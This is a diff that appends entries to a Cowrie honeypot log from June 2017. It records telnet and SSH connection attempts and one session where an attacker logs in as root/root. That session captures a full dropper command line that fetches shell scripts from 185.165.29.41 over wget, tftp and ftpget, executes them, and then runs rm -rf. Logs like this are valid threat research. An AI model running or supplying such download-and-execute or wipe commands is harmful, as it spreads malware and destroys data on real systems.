@@ -4478,3 +4478,54 @@
 2017-06-07T20:49:39+0000 [HoneyPotSSHTransport,9396,193.106.69.197] connection lost
 2017-06-07T20:49:39+0000 [HoneyPotSSHTransport,9396,193.106.69.197] Connection lost after 6 seconds
 2017-06-07T20:49:51+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 1.59.237.37:12834 (10.8.41.81:2223) [session: TT25652]
+2017-06-07T20:50:24+0000 [CowrieTelnetTransport,25652,1.59.237.37] first time for 1.59.237.37, need: 1
+2017-06-07T20:50:24+0000 [CowrieTelnetTransport,25652,1.59.237.37] login attempt: 1
+2017-06-07T20:50:26+0000 [CowrieTelnetTransport,25652,1.59.237.37] login attempt [root/root] succeeded
+2017-06-07T20:50:27+0000 [CowrieTelnetTransport,25652,1.59.237.37] Opening TTY Log: log/tty/20170607-205027-None-25652i.log
+2017-06-07T20:50:27+0000 [CowrieTelnetTransport,25652,1.59.237.37] Warning: state changed and new state returned
+2017-06-07T20:50:27+0000 [CowrieTelnetTransport,25651,90.189.181.111] Closing TTY Log: log/tty/20170607-204826-None-25651i.log after 121 seconds
+2017-06-07T20:50:27+0000 [CowrieTelnetTransport,25651,90.189.181.111] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-07T20:50:27+0000 [CowrieTelnetTransport,25651,90.189.181.111] Connection lost after 125 seconds
+2017-06-07T20:50:42+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:37495 (10.8.41.81:2222) [session: 070e597d]
+2017-06-07T20:50:44+0000 [CowrieTelnetTransport,25652,1.59.237.37] CMD: sh
+2017-06-07T20:50:44+0000 [CowrieTelnetTransport,25652,1.59.237.37] Command found: sh 
+2017-06-07T20:50:44+0000 [HoneyPotSSHTransport,9397,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-07T20:50:44+0000 [HoneyPotSSHTransport,9397,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-07T20:50:44+0000 [HoneyPotSSHTransport,9397,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T20:50:44+0000 [HoneyPotSSHTransport,9397,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T20:50:49+0000 [HoneyPotSSHTransport,9397,113.195.145.52] connection lost
+2017-06-07T20:50:49+0000 [HoneyPotSSHTransport,9397,113.195.145.52] Connection lost after 6 seconds
+2017-06-07T20:50:49+0000 [CowrieTelnetTransport,25652,1.59.237.37] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/baws.sh; chmod 777 baws.sh; sh baws.sh; tftp 185.165.29.41 -c get troute1.sh; chmod 777 troute1.sh; sh troute1.sh; tftp -r troute2.sh -g 185.165.29.41; chmod 777 troute2.sh; sh troute2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.41 troute.sh troute.sh; sh troute.sh; rm -rf baws.sh troute.sh troute1.sh troute2.sh; rm -rf *; exit
+2017-06-07T20:50:49+0000 [CowrieTelnetTransport,25652,1.59.237.37] Command found: cd /tmp
+2017-06-07T20:50:49+0000 [CowrieTelnetTransport,25652,1.59.237.37] Command found: cd /var/run
+2017-06-07T20:50:49+0000 [CowrieTelnetTransport,25652,1.59.237.37] Command found: cd /mnt
+2017-06-07T20:50:49+0000 [CowrieTelnetTransport,25652,1.59.237.37] Command found: cd /root
+2017-06-07T20:50:49+0000 [CowrieTelnetTransport,25652,1.59.237.37] Command found: cd /
+2017-06-07T20:50:49+0000 [CowrieTelnetTransport,25652,1.59.237.37] Command found: wget http://185.165.29.41/baws.sh
+2017-06-07T20:50:49+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.29.41/baws.sh>
+2017-06-07T20:50:49+0000 [HTTPPageDownloader,client] Command found: chmod 777 baws.sh
+2017-06-07T20:50:49+0000 [HTTPPageDownloader,client] Command found: sh baws.sh
+2017-06-07T20:50:49+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.29.41 -c get troute1.sh
+2017-06-07T20:50:49+0000 [HTTPPageDownloader,client] Command found: chmod 777 troute1.sh
+2017-06-07T20:50:49+0000 [HTTPPageDownloader,client] Command found: sh troute1.sh
+2017-06-07T20:50:49+0000 [HTTPPageDownloader,client] Command found: tftp -r troute2.sh -g 185.165.29.41
+2017-06-07T20:50:49+0000 [HTTPPageDownloader,client] Command found: chmod 777 troute2.sh
+2017-06-07T20:50:49+0000 [HTTPPageDownloader,client] Command found: sh troute2.sh
+2017-06-07T20:50:49+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 185.165.29.41 troute.sh troute.sh
+2017-06-07T20:50:50+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://185.165.29.41/troute.sh) with SHA-256 19d19c65e56f65ef1fbe1927e0c164b01d8ef250c0e270f5c9b02edd013b5a51 to dl/19d19c65e56f65ef1fbe1927e0c164b01d8ef250c0e270f5c9b02edd013b5a51
+2017-06-07T20:50:50+0000 [HTTPPageDownloader,client] Command found: sh /troute.sh
+2017-06-07T20:50:50+0000 [HTTPPageDownloader,client] Command found: rm -rf baws.sh /troute.sh troute1.sh troute2.sh
+2017-06-07T20:50:50+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-06-07T20:50:50+0000 [HTTPPageDownloader,client] Command found: exit 
+2017-06-07T20:50:50+0000 [HTTPPageDownloader,client] Process ended. Telnet Session disconnected
+2017-06-07T20:50:50+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.29.41/baws.sh>
+2017-06-07T20:50:50+0000 [CowrieTelnetTransport,25652,1.59.237.37] Not storing duplicate content 19d19c65e56f65ef1fbe1927e0c164b01d8ef250c0e270f5c9b02edd013b5a51
+2017-06-07T20:50:50+0000 [CowrieTelnetTransport,25652,1.59.237.37] Saved redir contents with SHA-256 19d19c65e56f65ef1fbe1927e0c164b01d8ef250c0e270f5c9b02edd013b5a51 to dl/19d19c65e56f65ef1fbe1927e0c164b01d8ef250c0e270f5c9b02edd013b5a51
+2017-06-07T20:50:50+0000 [CowrieTelnetTransport,25652,1.59.237.37] Closing TTY Log: log/tty/20170607-205027-None-25652i.log after 22 seconds
+2017-06-07T20:50:50+0000 [CowrieTelnetTransport,25652,1.59.237.37] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-07T20:50:50+0000 [CowrieTelnetTransport,25652,1.59.237.37] Connection lost after 58 seconds
+2017-06-07T20:50:59+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.164.63.174:37167 (10.8.41.81:2223) [session: TT25653]
+2017-06-07T20:51:00+0000 [CowrieTelnetTransport,25653,212.164.63.174] login attempt: 3
+2017-06-07T20:51:00+0000 [CowrieTelnetTransport,25653,212.164.63.174] login return, expect: [guest/123]
